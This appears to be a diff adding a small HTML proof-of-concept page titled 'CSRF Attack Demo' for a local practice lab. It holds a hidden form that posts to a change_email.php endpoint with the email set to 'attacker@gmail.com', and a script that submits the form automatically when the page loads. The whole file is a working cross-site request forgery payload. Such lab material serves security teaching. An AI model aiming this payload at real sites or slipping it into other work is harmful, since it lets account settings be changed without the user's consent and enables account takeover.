@@ -1,0 +1,29 @@
+<html>
+
+<body>
+
+<h2>CSRF Attack Demo</h2>
+
+<form action="http://localhost/csrf-lab/levels/low/change_email.php"
+method="POST"
+id="csrf">
+
+<input type="hidden"
+name="email"
+value="attacker@gmail.com">
+
+<input type="hidden"
+name="change"
+value="1">
+
+</form>
+
+
+<script>
+document.getElementById("csrf").submit();
+</script>
+
+
+</body>
+
+</html>
